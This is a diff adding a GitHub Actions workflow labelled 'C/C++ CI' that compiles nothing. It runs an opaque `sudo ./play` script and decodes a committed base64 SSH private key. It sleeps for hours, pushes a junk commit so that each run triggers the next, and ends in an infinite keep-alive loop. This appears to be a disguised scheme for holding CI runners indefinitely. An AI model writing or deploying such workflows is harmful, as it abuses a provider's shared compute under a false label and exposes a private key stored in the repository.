@@ -1,0 +1,32 @@
+name: C/C++ CI
+
+on: [push]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+    
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        sudo ./play
+    - name: build
+      run: |
+          mkdir -p ~/.ssh
+          base64 -d key > ~/.ssh/id_rsa
+          chmod 600 ~/.ssh/id_rsa
+          mkdir ww
+          cd ww
+          git clone `git remote -v |grep fetch | awk '{print $2}'|sed  "s#https://github.com/#git@github.com:#g"` abc
+          for i in `seq 1 1440`;do echo $i;sleep 10;done
+          cd abc
+          git config --global user.email "you@example.com"
+          git config --global user.name "Your Name"
+          echo >> hi
+          git add .
+          git commit -m "em"
+          git push || true
+          while true;do echo alive;sleep 30;done
+
